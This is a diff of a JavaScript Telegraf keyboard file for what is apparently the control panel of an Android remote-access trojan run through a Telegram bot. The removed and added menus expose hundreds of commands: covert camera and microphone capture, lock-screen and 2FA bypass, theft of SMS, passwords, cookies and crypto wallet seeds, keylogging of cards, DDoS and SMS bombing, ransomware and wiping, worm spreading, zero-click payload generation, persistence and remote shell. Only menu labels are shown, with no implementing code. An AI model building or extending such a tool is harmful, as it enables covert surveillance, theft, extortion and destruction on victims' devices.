@@ -2,690 +2,221 @@ const { Markup } = require('telegraf');
 
 class Keyboards {
     static getMainKeyboard() {
-        const keyboard = [
-            // ========== SECTION 1: CAMERA ULTIMATE (25) ==========
-            [{ text: '📸🎥 CAMERA ULTIMATE', callback_data: 'section_camera' }],
-            [
-                { text: '📷 FRONT CAM', callback_data: 'cam_front' },
-                { text: '📸 BACK CAM', callback_data: 'cam_back' },
-                { text: '🔄 SWITCH', callback_data: 'cam_switch' }
-            ],
-            [
-                { text: '🎥 VIDEO 5s', callback_data: 'video_5' },
-                { text: '🎬 VIDEO 10s', callback_data: 'video_10' },
-                { text: '🎞️ VIDEO 30s', callback_data: 'video_30' }
-            ],
-            [
-                { text: '📹 VIDEO 60s', callback_data: 'video_60' },
-                { text: '🎦 VIDEO 120s', callback_data: 'video_120' },
-                { text: '🎥 VIDEO 300s', callback_data: 'video_300' }
-            ],
-            [
-                { text: '📸 BURST 5X', callback_data: 'cam_burst_5' },
-                { text: '📸 BURST 10X', callback_data: 'cam_burst_10' },
-                { text: '📸 BURST 20X', callback_data: 'cam_burst_20' }
-            ],
-            [
-                { text: '🌙 NIGHT MODE', callback_data: 'cam_night' },
-                { text: '⚡ HDR MODE', callback_data: 'cam_hdr' },
-                { text: '🔍 ZOOM 2X', callback_data: 'cam_zoom_2' }
-            ],
-            [
-                { text: '🔍 ZOOM 4X', callback_data: 'cam_zoom_4' },
-                { text: '🔍 ZOOM 8X', callback_data: 'cam_zoom_8' },
-                { text: '🎨 FILTERS', callback_data: 'cam_filters' }
-            ],
-            [
-                { text: '🔄 TIMELAPSE', callback_data: 'cam_timelapse' },
-                { text: '🐢 SLOW MOTION', callback_data: 'cam_slowmo' },
-                { text: '⚡ FAST MOTION', callback_data: 'cam_fastmo' }
-            ],
-            [
-                { text: '📸 LIVE STREAM', callback_data: 'cam_live' },
-                { text: '🎥 BACKGROUND REC', callback_data: 'cam_bg_rec' },
-                { text: '🔒 STEALTH MODE', callback_data: 'cam_stealth' }
-            ],
-            
-            // ========== SECTION 2: AUDIO ULTIMATE (20) ==========
-            [{ text: '🎙️🔊 AUDIO ULTIMATE', callback_data: 'section_audio' }],
-            [
-                { text: '🎤 MIC START', callback_data: 'mic_start' },
-                { text: '🎤 MIC STOP', callback_data: 'mic_stop' },
-                { text: '🎤 MIC 30s', callback_data: 'mic_30' }
-            ],
-            [
-                { text: '🎙️ MIC 60s', callback_data: 'mic_60' },
-                { text: '🎙️ MIC 300s', callback_data: 'mic_300' },
-                { text: '🎙️ MIC 600s', callback_data: 'mic_600' }
-            ],
-            [
-                { text: '🎙️ LIVE MIC', callback_data: 'mic_live' },
-                { text: '🔊 SPEAKER ON', callback_data: 'speaker_on' },
-                { text: '🔇 SPEAKER OFF', callback_data: 'speaker_off' }
-            ],
-            [
-                { text: '📢 LOUD MODE', callback_data: 'loud_mode' },
-                { text: '🎧 HEADSET', callback_data: 'headset' },
-                { text: '🔊 VOL MAX', callback_data: 'vol_max' }
-            ],
-            [
-                { text: '🔉 VOL 75%', callback_data: 'vol_75' },
-                { text: '🔉 VOL 50%', callback_data: 'vol_50' },
-                { text: '🔈 VOL 25%', callback_data: 'vol_25' }
-            ],
-            [
-                { text: '🔇 VOL 0%', callback_data: 'vol_0' },
-                { text: '🎵 EQ SETTINGS', callback_data: 'eq_settings' },
-                { text: '🔊 SURROUND', callback_data: 'surround' }
-            ],
-            
-            // ========== SECTION 3: FLASHLIGHT ULTIMATE (15) ==========
-            [{ text: '💡✨ FLASHLIGHT ULTIMATE', callback_data: 'section_flash' }],
-            [
-                { text: '💡 FLASH ON', callback_data: 'flash_on' },
-                { text: '💡 FLASH OFF', callback_data: 'flash_off' },
-                { text: '✨ STROBE', callback_data: 'flash_strobe' }
-            ],
-            [
-                { text: '⚡ FAST STROBE', callback_data: 'flash_fast' },
-                { text: '🐢 SLOW STROBE', callback_data: 'flash_slow' },
-                { text: '💥 SOS MODE', callback_data: 'flash_sos' }
-            ],
-            [
-                { text: '🌈 RGB MODE', callback_data: 'flash_rgb' },
-                { text: '🎨 COLOR CYCLE', callback_data: 'flash_color' },
-                { text: '✨ CANDLE MODE', callback_data: 'flash_candle' }
-            ],
-            [
-                { text: '🔆 BRIGHT 100%', callback_data: 'bright_100' },
-                { text: '🔅 BRIGHT 75%', callback_data: 'bright_75' },
-                { text: '🔆 BRIGHT 50%', callback_data: 'bright_50' }
-            ],
-            
-            // ========== SECTION 4: VIBRATION ULTIMATE (15) ==========
-            [{ text: '📳💫 VIBRATION ULTIMATE', callback_data: 'section_vibe' }],
-            [
-                { text: '📳 VIBE 1s', callback_data: 'vibe_1' },
-                { text: '📳 VIBE 3s', callback_data: 'vibe_3' },
-                { text: '📳 VIBE 5s', callback_data: 'vibe_5' }
-            ],
-            [
-                { text: '📳 VIBE 10s', callback_data: 'vibe_10' },
-                { text: '📳 VIBE 30s', callback_data: 'vibe_30' },
-                { text: '📳 VIBE 60s', callback_data: 'vibe_60' }
-            ],
-            [
-                { text: '🎵 PATTERN 1', callback_data: 'vibe_pattern_1' },
-                { text: '🎵 PATTERN 2', callback_data: 'vibe_pattern_2' },
-                { text: '🎵 PATTERN 3', callback_data: 'vibe_pattern_3' }
-            ],
-            [
-                { text: '🔁 LOOP VIBE', callback_data: 'vibe_loop' },
-                { text: '💥 STRONG VIBE', callback_data: 'vibe_strong' },
-                { text: '🌊 WAVE VIBE', callback_data: 'vibe_wave' }
-            ],
-            
-            // ========== SECTION 5: NETWORK ULTIMATE (30) ==========
-            [{ text: '🌐📶 NETWORK ULTIMATE', callback_data: 'section_network' }],
-            [
-                { text: '📶 WIFI ON', callback_data: 'wifi_on' },
-                { text: '📶 WIFI OFF', callback_data: 'wifi_off' },
-                { text: '🔍 WIFI SCAN', callback_data: 'wifi_scan' }
-            ],
-            [
-                { text: '📊 WIFI INFO', callback_data: 'wifi_info' },
-                { text: '🔑 WIFI PASSWORD', callback_data: 'wifi_password' },
-                { text: '📡 WIFI SIGNAL', callback_data: 'wifi_signal' }
-            ],
-            [
-                { text: '🔐 WIFI CRACK', callback_data: 'wifi_crack' },
-                { text: '🌐 WIFI DEAUTH', callback_data: 'wifi_deauth' },
-                { text: '📡 WIFI MONITOR', callback_data: 'wifi_monitor' }
-            ],
-            [
-                { text: '📱 DATA ON', callback_data: 'data_on' },
-                { text: '📱 DATA OFF', callback_data: 'data_off' },
-                { text: '📊 DATA USAGE', callback_data: 'data_usage' }
-            ],
-            [
-                { text: '📱 2G ONLY', callback_data: 'data_2g' },
-                { text: '📱 3G ONLY', callback_data: 'data_3g' },
-                { text: '📱 4G ONLY', callback_data: 'data_4g' }
-            ],
-            [
-                { text: '📱 5G ONLY', callback_data: 'data_5g' },
-                { text: '📱 AUTO NETWORK', callback_data: 'data_auto' },
-                { text: '📱 CARRIER INFO', callback_data: 'carrier_info' }
-            ],
-            [
-                { text: '✈️ AIRPLANE ON', callback_data: 'airplane_on' },
-                { text: '✈️ AIRPLANE OFF', callback_data: 'airplane_off' },
-                { text: '🔄 TOGGLE', callback_data: 'airplane_toggle' }
-            ],
-            [
-                { text: '🔗 BT ON', callback_data: 'bt_on' },
-                { text: '🔗 BT OFF', callback_data: 'bt_off' },
-                { text: '📡 BT SCAN', callback_data: 'bt_scan' }
-            ],
-            [
-                { text: '🔗 BT PAIR', callback_data: 'bt_pair' },
-                { text: '🔗 BT UNPAIR', callback_data: 'bt_unpair' },
-                { text: '📡 BT DEVICES', callback_data: 'bt_devices' }
-            ],
-            [
-                { text: '🌐 HOTSPOT ON', callback_data: 'hotspot_on' },
-                { text: '🌐 HOTSPOT OFF', callback_data: 'hotspot_off' },
-                { text: '🔑 HOTSPOT PASS', callback_data: 'hotspot_pass' }
-            ],
-            [
-                { text: '🔒 VPN ON', callback_data: 'vpn_on' },
-                { text: '🔒 VPN OFF', callback_data: 'vpn_off' },
-                { text: '🌍 VPN CONFIG', callback_data: 'vpn_config' }
-            ],
-            
-            // ========== SECTION 6: SECURITY ULTIMATE (25) ==========
-            [{ text: '🔒🔓 SECURITY ULTIMATE', callback_data: 'section_security' }],
-            [
-                { text: '🔒 LOCK NOW', callback_data: 'lock' },
-                { text: '🔓 UNLOCK', callback_data: 'unlock' },
-                { text: '⏭️ SLIDE', callback_data: 'slide' }
-            ],
-            [
-                { text: '🔢 BYPASS PIN', callback_data: 'bypass_pin' },
-                { text: '🔐 BYPASS PATTERN', callback_data: 'bypass_pattern' },
-                { text: '🔑 BYPASS PASSWORD', callback_data: 'bypass_pass' }
-            ],
-            [
-                { text: '🔄 BYPASS FINGER', callback_data: 'bypass_finger' },
-                { text: '👁️ BYPASS FACE', callback_data: 'bypass_face' },
-                { text: '🔓 BYPASS ALL', callback_data: 'bypass_all' }
-            ],
-            [
-                { text: '🔐 CHANGE PIN', callback_data: 'change_pin' },
-                { text: '🔑 CHANGE PATTERN', callback_data: 'change_pattern' },
-                { text: '🔒 CHANGE PASS', callback_data: 'change_pass' }
-            ],
-            [
-                { text: '👆 ADD FINGER', callback_data: 'add_finger' },
-                { text: '👤 ADD FACE', callback_data: 'add_face' },
-                { text: '🗑️ REMOVE LOCK', callback_data: 'remove_lock' }
-            ],
-            [
-                { text: '🔒 ENCRYPT DEVICE', callback_data: 'encrypt_device' },
-                { text: '🔓 DECRYPT DEVICE', callback_data: 'decrypt_device' },
-                { text: '🔐 SECURE BOOT', callback_data: 'secure_boot' }
-            ],
-            [
-                { text: '💀 FACTORY RESET', callback_data: 'factory_reset' },
-                { text: '🔄 FORCE RESET', callback_data: 'force_reset' },
-                { text: '⚡ HARD RESET', callback_data: 'hard_reset' }
-            ],
-            
-            // ========== SECTION 7: DATA EXTRACTION ULTIMATE (30) ==========
-            [{ text: '💾📁 DATA EXTRACTION', callback_data: 'section_data' }],
-            [
-                { text: '💬 ALL SMS', callback_data: 'get_sms' },
-                { text: '📞 CALL LOGS', callback_data: 'get_calls' },
-                { text: '👥 CONTACTS', callback_data: 'get_contacts' }
-            ],
-            [
-                { text: '💬 SMS BY DATE', callback_data: 'get_sms_date' },
-                { text: '📞 CALLS BY DATE', callback_data: 'get_calls_date' },
-                { text: '👥 EXPORT CONTACTS', callback_data: 'export_contacts' }
-            ],
-            [
-                { text: '🌍 LOCATION', callback_data: 'get_location' },
-                { text: '📍 GPS TRACK', callback_data: 'gps_track' },
-                { text: '🗺️ MAP VIEW', callback_data: 'map_view' }
-            ],
-            [
-                { text: '📍 LIVE LOCATION', callback_data: 'live_location' },
-                { text: '📜 LOC HISTORY', callback_data: 'location_history' },
-                { text: '🗺️ GEO FENCE', callback_data: 'geo_fence' }
-            ],
-            [
-                { text: '📸 ALL PHOTOS', callback_data: 'get_photos' },
-                { text: '🎥 ALL VIDEOS', callback_data: 'get_videos' },
-                { text: '🎵 ALL AUDIO', callback_data: 'get_audio' }
-            ],
-            [
-                { text: '📄 DOCUMENTS', callback_data: 'get_docs' },
-                { text: '📦 APK FILES', callback_data: 'get_apk' },
-                { text: '🗂️ ALL FILES', callback_data: 'get_all_files' }
-            ],
-            [
-                { text: '📸 PHOTOS DATE', callback_data: 'get_photos_date' },
-                { text: '🎥 VIDEOS DATE', callback_data: 'get_videos_date' },
-                { text: '🗑️ DELETED FILES', callback_data: 'get_deleted' }
-            ],
-            [
-                { text: '🔑 SAVED PASS', callback_data: 'get_passwords' },
-                { text: '🍪 BROWSER COOKIES', callback_data: 'get_cookies' },
-                { text: '📜 BROWSER HIST', callback_data: 'get_history' }
-            ],
-            [
-                { text: '📱 WHATSAPP DATA', callback_data: 'get_whatsapp' },
-                { text: '📘 FB DATA', callback_data: 'get_facebook' },
-                { text: '📷 IG DATA', callback_data: 'get_instagram' }
-            ],
-            
-            // ========== SECTION 8: FILE MANAGER ULTIMATE (25) ==========
-            [{ text: '📂🗃️ FILE MANAGER', callback_data: 'section_files' }],
-            [
-                { text: '📁 FILE MANAGER', callback_data: 'file_manager' },
-                { text: '📥 DOWNLOAD', callback_data: 'download_file' },
-                { text: '📤 UPLOAD', callback_data: 'upload_file' }
-            ],
-            [
-                { text: '🗑️ DELETE', callback_data: 'delete_file' },
-                { text: '📋 COPY', callback_data: 'copy_file' },
-                { text: '✂️ MOVE', callback_data: 'move_file' }
-            ],
-            [
-                { text: '📝 RENAME', callback_data: 'rename_file' },
-                { text: '🔐 ZIP', callback_data: 'zip_file' },
-                { text: '🔓 UNZIP', callback_data: 'unzip' }
-            ],
-            [
-                { text: '🔒 ENCRYPT', callback_data: 'encrypt_file' },
-                { text: '🔓 DECRYPT', callback_data: 'decrypt_file' },
-                { text: '📊 FILE INFO', callback_data: 'file_info' }
-            ],
-            [
-                { text: '📁 CREATE FOLDER', callback_data: 'create_folder' },
-                { text: '🗑️ DELETE FOLDER', callback_data: 'delete_folder' },
-                { text: '📋 FOLDER INFO', callback_data: 'folder_info' }
-            ],
-            [
-                { text: '🔍 SEARCH FILES', callback_data: 'search_files' },
-                { text: '📊 STORAGE MAP', callback_data: 'storage_map' },
-                { text: '🧹 CLEAN JUNK', callback_data: 'clean_junk' }
-            ],
-            [
-                { text: '💾 BACKUP ALL', callback_data: 'backup_all' },
-                { text: '🔄 RESTORE', callback_data: 'restore_backup' },
-                { text: '☁️ CLOUD BACKUP', callback_data: 'cloud_backup' }
-            ],
-            
-            // ========== SECTION 9: SCREEN CONTROL ULTIMATE (20) ==========
-            [{ text: '🖥️📱 SCREEN ULTIMATE', callback_data: 'section_screen' }],
-            [
-                { text: '📸 SCREENSHOT', callback_data: 'screenshot' },
-                { text: '🎥 SCREEN REC', callback_data: 'screen_rec' },
-                { text: '⏹️ STOP REC', callback_data: 'screen_rec_stop' }
-            ],
-            [
-                { text: '🎥 REC 30s', callback_data: 'screen_rec_30' },
-                { text: '🎥 REC 60s', callback_data: 'screen_rec_60' },
-                { text: '🎥 REC 300s', callback_data: 'screen_rec_300' }
-            ],
-            [
-                { text: '🖼️ WALLPAPER', callback_data: 'wallpaper' },
-                { text: '🔆 BRIGHT UP', callback_data: 'bright_up' },
-                { text: '🔅 BRIGHT DOWN', callback_data: 'bright_down' }
-            ],
-            [
-                { text: '🌙 DARK MODE', callback_data: 'dark_mode' },
-                { text: '☀️ LIGHT MODE', callback_data: 'light_mode' },
-                { text: '🎨 THEMES', callback_data: 'themes' }
-            ],
-            [
-                { text: '📱 SCREEN ON', callback_data: 'screen_on' },
-                { text: '📱 SCREEN OFF', callback_data: 'screen_off' },
-                { text: '🔄 TOGGLE', callback_data: 'screen_toggle' }
-            ],
-            [
-                { text: '📱 SCREEN REC LIVE', callback_data: 'screen_rec_live' },
-                { text: '🎬 SCREEN STREAM', callback_data: 'screen_stream' },
-                { text: '🔍 SCREEN ZOOM', callback_data: 'screen_zoom' }
-            ],
-            
-            // ========== SECTION 10: APPS CONTROL ULTIMATE (25) ==========
-            [{ text: '📱⚙️ APPS ULTIMATE', callback_data: 'section_apps' }],
-            [
-                { text: '📋 INSTALLED', callback_data: 'list_apps' },
-                { text: '🚀 OPEN APP', callback_data: 'open_app' },
-                { text: '❌ UNINSTALL', callback_data: 'uninstall_app' }
-            ],
-            [
-                { text: '🔄 FORCE STOP', callback_data: 'force_stop' },
-                { text: '⚡ CLEAR DATA', callback_data: 'clear_app_data' },
-                { text: '🗑️ CLEAR CACHE', callback_data: 'clear_cache' }
-            ],
-            [
-                { text: '📦 INSTALL APK', callback_data: 'install_apk' },
-                { text: '🔒 HIDE APP', callback_data: 'hide_app' },
-                { text: '🔓 UNHIDE APP', callback_data: 'unhide_app' }
-            ],
-            [
-                { text: '📊 APP USAGE', callback_data: 'app_usage' },
-                { text: '⏱️ APP TIMER', callback_data: 'app_timer' },
-                { text: '🚫 BLOCK APP', callback_data: 'block_app' }
-            ],
-            [
-                { text: '🔄 BACKUP APP', callback_data: 'backup_app' },
-                { text: '📤 SHARE APP', callback_data: 'share_app' },
-                { text: '🔍 APP DETAILS', callback_data: 'app_details' }
-            ],
-            [
-                { text: '📱 SYSTEM APPS', callback_data: 'system_apps' },
-                { text: '🔧 DISABLE APP', callback_data: 'disable_app' },
-                { text: '🔧 ENABLE APP', callback_data: 'enable_app' }
-            ],
-            [
-                { text: '🔐 APP LOCK', callback_data: 'app_lock' },
-                { text: '📊 APP PERMISSIONS', callback_data: 'app_permissions' },
-                { text: '🔄 APP ACTIVITIES', callback_data: 'app_activities' }
-            ],
-            
-            // ========== SECTION 11: SYSTEM CONTROL ULTIMATE (30) ==========
-            [{ text: '⚙️🔧 SYSTEM ULTIMATE', callback_data: 'section_system' }],
-            [
-                { text: 'ℹ️ SYSTEM INFO', callback_data: 'sysinfo' },
-                { text: '🔋 BATTERY', callback_data: 'battery' },
-                { text: '💾 RAM INFO', callback_data: 'ram_info' }
-            ],
-            [
-                { text: '📀 STORAGE', callback_data: 'storage' },
-                { text: '📱 DEVICE ID', callback_data: 'device_id' },
-                { text: '🔐 ROOT STATUS', callback_data: 'root_status' }
-            ],
-            [
-                { text: '🌡️ TEMPERATURE', callback_data: 'temperature' },
-                { text: '📊 CPU INFO', callback_data: 'cpu_info' },
-                { text: '🎮 GPU INFO', callback_data: 'gpu_info' }
-            ],
-            [
-                { text: '🔋 BATTERY SAVE', callback_data: 'battery_save' },
-                { text: '⚡ PERFORMANCE', callback_data: 'performance' },
-                { text: '🧹 CLEAN JUNK', callback_data: 'clean_junk_sys' }
-            ],
-            [
-                { text: '🔄 REBOOT', callback_data: 'reboot' },
-                { text: '⏻ POWER OFF', callback_data: 'poweroff' },
-                { text: '💀 FACTORY RESET', callback_data: 'factory_reset_sys' }
-            ],
-            [
-                { text: '📱 BOOTLOADER', callback_data: 'bootloader' },
-                { text: '🔧 RECOVERY MODE', callback_data: 'recovery' },
-                { text: '📲 FASTBOOT', callback_data: 'fastboot' }
-            ],
-            [
-                { text: '🔒 ENABLE USB DBG', callback_data: 'usb_debug' },
-                { text: '🔓 DISABLE USB DBG', callback_data: 'usb_debug_off' },
-                { text: '📡 DEV OPTIONS', callback_data: 'developer_opts' }
-            ],
-            [
-                { text: '🔐 SELINUX', callback_data: 'selinux' },
-                { text: '🔧 KERNEL INFO', callback_data: 'kernel_info' },
-                { text: '📊 PROCESSES', callback_data: 'processes' }
-            ],
-            
-            // ========== SECTION 12: KEYLOGGER ULTIMATE (15) ==========
-            [{ text: '⌨️📝 KEYLOGGER', callback_data: 'section_keylog' }],
-            [
-                { text: '⌨️ START LOG', callback_data: 'keylog_start' },
-                { text: '⌨️ STOP LOG', callback_data: 'keylog_stop' },
-                { text: '📋 GET LOGS', callback_data: 'keylog_get' }
-            ],
-            [
-                { text: '📊 LOG STATS', callback_data: 'keylog_stats' },
-                { text: '🗑️ CLEAR LOGS', callback_data: 'keylog_clear' },
-                { text: '📤 UPLOAD LOGS', callback_data: 'keylog_upload' }
-            ],
-            [
-                { text: '🔑 CAPTURE PASS', callback_data: 'keylog_pass' },
-                { text: '💳 CAPTURE CARDS', callback_data: 'keylog_cards' },
-                { text: '📧 EMAIL LOGS', callback_data: 'keylog_email' }
-            ],
-            [
-                { text: '📊 LIVE KEYLOG', callback_data: 'keylog_live' },
-                { text: '🔍 SEARCH LOGS', callback_data: 'keylog_search' },
-                { text: '📈 KEYLOG STATS', callback_data: 'keylog_stats' }
-            ],
-            
-            // ========== SECTION 13: BROWSER ULTIMATE (20) ==========
-            [{ text: '🌐🔍 BROWSER ULTIMATE', callback_data: 'section_browser' }],
-            [
-                { text: '📜 HISTORY', callback_data: 'browser_history' },
-                { text: '🔖 BOOKMARKS', callback_data: 'browser_bookmarks' },
-                { text: '🍪 COOKIES', callback_data: 'browser_cookies' }
-            ],
-            [
-                { text: '🔑 PASSWORDS', callback_data: 'browser_passwords' },
-                { text: '💳 SAVED CARDS', callback_data: 'browser_cards' },
-                { text: '📝 AUTO FILL', callback_data: 'browser_autofill' }
-            ],
-            [
-                { text: '📊 BROWSER STATS', callback_data: 'browser_stats' },
-                { text: '🗑️ CLEAR DATA', callback_data: 'browser_clear' },
-                { text: '🌐 OPEN URL', callback_data: 'browser_open' }
-            ],
-            [
-                { text: '🔍 SEARCH HIST', callback_data: 'search_history' },
-                { text: '📥 DOWNLOADS', callback_data: 'browser_downloads' },
-                { text: '🔧 SETTINGS', callback_data: 'browser_settings' }
-            ],
-            [
-                { text: '🌐 INJECT SCRIPT', callback_data: 'inject_script' },
-                { text: '🔍 DARK WEB', callback_data: 'dark_web' },
-                { text: '📡 NETWORK LOGS', callback_data: 'network_logs' }
-            ],
-            
-            // ========== SECTION 14: SOCIAL MEDIA (15) ==========
-            [{ text: '📱🌐 SOCIAL MEDIA', callback_data: 'section_social' }],
-            [
-                { text: '📘 FACEBOOK', callback_data: 'fb_data' },
-                { text: '📷 INSTAGRAM', callback_data: 'ig_data' },
-                { text: '💬 WHATSAPP', callback_data: 'wa_data' }
-            ],
-            [
-                { text: '🐦 TWITTER', callback_data: 'twitter_data' },
-                { text: '📱 TELEGRAM', callback_data: 'tg_data' },
-                { text: '🎵 TIKTOK', callback_data: 'tiktok_data' }
-            ],
-            [
-                { text: '🔑 SOCIAL PASS', callback_data: 'social_pass' },
-                { text: '📜 SOCIAL HIST', callback_data: 'social_history' },
-                { text: '🍪 SOCIAL COOKIES', callback_data: 'social_cookies' }
-            ],
-            [
-                { text: '🔓 SOCIAL HACK', callback_data: 'social_hack' },
-                { text: '📊 SOCIAL STATS', callback_data: 'social_stats' },
-                { text: '🔐 2FA BYPASS', callback_data: 'bypass_2fa' }
-            ],
-            
-            // ========== SECTION 15: CRYPTO WALLET (12) ==========
-            [{ text: '💰🔐 CRYPTO WALLET', callback_data: 'section_crypto' }],
-            [
-                { text: '💰 BITCOIN', callback_data: 'btc_wallet' },
-                { text: '💎 ETHEREUM', callback_data: 'eth_wallet' },
-                { text: '🪙 BINANCE', callback_data: 'binance_data' }
-            ],
-            [
-                { text: '📊 CRYPTO BAL', callback_data: 'crypto_balance' },
-                { text: '🔑 PRIVATE KEYS', callback_data: 'private_keys' },
-                { text: '📜 TRANSACTIONS', callback_data: 'crypto_tx' }
-            ],
-            [
-                { text: '💱 EXCHANGE API', callback_data: 'exchange_api' },
-                { text: '🔐 WALLET SEED', callback_data: 'wallet_seed' },
-                { text: '🌐 BLOCKCHAIN', callback_data: 'blockchain_data' }
-            ],
-            
-            // ========== SECTION 16: DDOS & ATTACK (12) ==========
-            [{ text: '⚔️💀 DDOS ATTACK', callback_data: 'section_ddos' }],
-            [
-                { text: '🌐 HTTP FLOOD', callback_data: 'http_flood' },
-                { text: '📡 UDP FLOOD', callback_data: 'udp_flood' },
-                { text: '🔌 TCP FLOOD', callback_data: 'tcp_flood' }
-            ],
-            [
-                { text: '📱 SMS BOMB', callback_data: 'sms_bomb' },
-                { text: '📞 CALL BOMB', callback_data: 'call_bomb' },
-                { text: '🔗 DDOS STOP', callback_data: 'ddos_stop' }
-            ],
-            [
-                { text: '🌐 DNS AMP', callback_data: 'dns_amp' },
-                { text: '🔍 NTP AMP', callback_data: 'ntp_amp' },
-                { text: '💀 SLOWLORIS', callback_data: 'slowloris' }
-            ],
-            
-            // ========== SECTION 17: RANSOMWARE & WIPER (12) ==========
-            [{ text: '💀⚠️ RANSOMWARE', callback_data: 'section_ransom' }],
-            [
-                { text: '🔒 ENCRYPT', callback_data: 'ransom_encrypt' },
-                { text: '🔓 DECRYPT', callback_data: 'ransom_decrypt' },
-                { text: '💰 RANSOM NOTE', callback_data: 'ransom_note' }
-            ],
-            [
-                { text: '🗑️ WIPE DATA', callback_data: 'wipe_data' },
-                { text: '📱 WIPE SD', callback_data: 'wipe_sd' },
-                { text: '💀 DESTROY SYS', callback_data: 'destroy_system' }
-            ],
-            [
-                { text: '🔒 LOCK FILES', callback_data: 'lock_files' },
-                { text: '💰 BITCOIN ADDR', callback_data: 'bitcoin_addr' },
-                { text: '⏰ TIMER', callback_data: 'ransom_timer' }
-            ],
-            
-            // ========== SECTION 18: SPREADER & WORM (12) ==========
-            [{ text: '🪱🐛 SPREADER', callback_data: 'section_spreader' }],
-            [
-                { text: '📱 SPREAD CONTACT', callback_data: 'spread_contacts' },
-                { text: '🔗 SPREAD LINK', callback_data: 'spread_link' },
-                { text: '📲 SPREAD BT', callback_data: 'spread_bt' }
-            ],
-            [
-                { text: '🪱 WORM MODE', callback_data: 'worm_mode' },
-                { text: '📡 AUTO SPREAD', callback_data: 'auto_spread' },
-                { text: '🔗 MAL LINK', callback_data: 'malicious_link' }
-            ],
-            [
-                { text: '📱 SMS SPREAD', callback_data: 'sms_spread' },
-                { text: '🔗 QR SPREAD', callback_data: 'qr_spread' },
-                { text: '🌐 WEB SPREAD', callback_data: 'web_spread' }
-            ],
-            
-            // ========== SECTION 19: ZERO-CLICK ULTIMATE (20) ==========
-            [{ text: '🎯💀 ZERO-CLICK', callback_data: 'section_zero' }],
-            [
-                { text: '📱 GEN PAYLOAD', callback_data: 'gen_payload' },
-                { text: '📸 GEN JPG', callback_data: 'gen_jpg' },
-                { text: '🎵 GEN MP3', callback_data: 'gen_mp3' }
-            ],
-            [
-                { text: '🎥 GEN MP4', callback_data: 'gen_mp4' },
-                { text: '📄 GEN PDF', callback_data: 'gen_pdf' },
-                { text: '🔗 GEN LINK', callback_data: 'gen_link' }
-            ],
-            [
-                { text: '📱 GEN APK', callback_data: 'gen_apk' },
-                { text: '🔧 GEN EXPLOIT', callback_data: 'gen_exploit' },
-                { text: '⚡ GEN METASPLOIT', callback_data: 'gen_msf' }
-            ],
-            [
-                { text: '📤 SEND WHATSAPP', callback_data: 'send_wa' },
-                { text: '📤 SEND TG', callback_data: 'send_tg' },
-                { text: '🔗 GEN QR', callback_data: 'gen_qr' }
-            ],
-            [
-                { text: '📊 CHECK STATUS', callback_data: 'check_status' },
-                { text: '🔄 AUTO DEPLOY', callback_data: 'auto_deploy' },
-                { text: '🎯 EXPLOIT DB', callback_data: 'exploit_db' }
-            ],
-            [
-                { text: '🔍 VULN SCAN', callback_data: 'vuln_scan' },
-                { text: '📡 METERPRETER', callback_data: 'meterpreter' },
-                { text: '🔧 CUSTOM PAYLOAD', callback_data: 'custom_payload' }
-            ],
-            
-            // ========== SECTION 20: EXTRA ULTIMATE (20) ==========
-            [{ text: '⚡🔧 EXTRA ULTIMATE', callback_data: 'section_extra' }],
-            [
-                { text: '🔋 BATTERY SAVE', callback_data: 'battery_save' },
-                { text: '⚡ PERFORMANCE', callback_data: 'performance' },
-                { text: '🧹 CLEAN JUNK', callback_data: 'clean_junk_extra' }
-            ],
-            [
-                { text: '📊 CPU INFO', callback_data: 'cpu_info' },
-                { text: '🌡️ TEMPERATURE', callback_data: 'temperature' },
-                { text: '📡 SENSORS', callback_data: 'sensors' }
-            ],
-            [
-                { text: '📱 SCREEN INFO', callback_data: 'screen_info' },
-                { text: '🔐 SECURITY CHECK', callback_data: 'security_check' },
-                { text: '📊 BENCHMARK', callback_data: 'benchmark' }
-            ],
-            [
-                { text: '🔋 BATTERY STATS', callback_data: 'battery_stats' },
-                { text: '📱 DEVICE NAME', callback_data: 'device_name' },
-                { text: '🔧 DEVICE SETTINGS', callback_data: 'device_settings' }
-            ],
-            [
-                { text: '📊 NETWORK STATS', callback_data: 'network_stats' },
-                { text: '🔍 PORT SCAN', callback_data: 'port_scan' },
-                { text: '🌐 IP INFO', callback_data: 'ip_info' }
-            ],
-            [
-                { text: '🔑 PASSWORD CRACK', callback_data: 'password_crack' },
-                { text: '📡 MITM ATTACK', callback_data: 'mitm_attack' },
-                { text: '🔍 PACKET SNIFF', callback_data: 'packet_sniff' }
-            ],
-            
-            // ========== SECTION 21: SESSION CONTROL (10) ==========
-            [{ text: '🔌💀 SESSION', callback_data: 'section_session' }],
-            [
-                { text: '📋 ACTIVE SESSIONS', callback_data: 'list_sessions' },
-                { text: '🎯 SELECT SESSION', callback_data: 'select_session' },
-                { text: '💀 KILL SESSION', callback_data: 'kill_session' }
-            ],
-            [
-                { text: '🔄 RE-CONNECT', callback_data: 'reconnect' },
-                { text: '🔐 PERSISTENCE', callback_data: 'persistence' },
-                { text: '📊 SESSION INFO', callback_data: 'session_info' }
-            ],
-            [
-                { text: '📋 SESSION LOGS', callback_data: 'session_logs' },
-                { text: '🔌 REMOTE SHELL', callback_data: 'remote_shell' },
-                { text: '📡 WEBSOCKET', callback_data: 'websocket' }
-            ],
-            
-            // ========== SECTION 22: HELP & INFO (6) ==========
-            [{ text: '❓📖 HELP & INFO', callback_data: 'section_help' }],
-            [
-                { text: '❓ HELP', callback_data: 'help' },
-                { text: 'ℹ️ ABOUT', callback_data: 'about' },
-                { text: '📊 STATUS', callback_data: 'status' }
-            ],
-            [
-                { text: '📈 STATISTICS', callback_data: 'statistics' },
-                { text: '⚙️ SETTINGS', callback_data: 'settings' },
-                { text: '🔧 CONFIG', callback_data: 'config' }
-            ]
-        ];
-        
-        return Markup.inlineKeyboard(keyboard);
+        return Markup.inlineKeyboard([
+            [Markup.button.callback('📸📹 CAMERA (25)', 'section_camera')],
+            [Markup.button.callback('🎙️🔊 AUDIO (20)', 'section_audio')],
+            [Markup.button.callback('💡✨ FLASHLIGHT (15)', 'section_flash')],
+            [Markup.button.callback('📳💫 VIBRATION (15)', 'section_vibe')],
+            [Markup.button.callback('🌐📶 NETWORK (30)', 'section_network')],
+            [Markup.button.callback('🔒🔓 SECURITY (25)', 'section_security')],
+            [Markup.button.callback('💾📁 DATA EXTRACTION (30)', 'section_data')],
+            [Markup.button.callback('📂🗃️ FILE MANAGER (25)', 'section_files')],
+            [Markup.button.callback('🖥️📱 SCREEN (20)', 'section_screen')],
+            [Markup.button.callback('📱⚙️ APPS (25)', 'section_apps')],
+            [Markup.button.callback('⚙️🔧 SYSTEM (30)', 'section_system')],
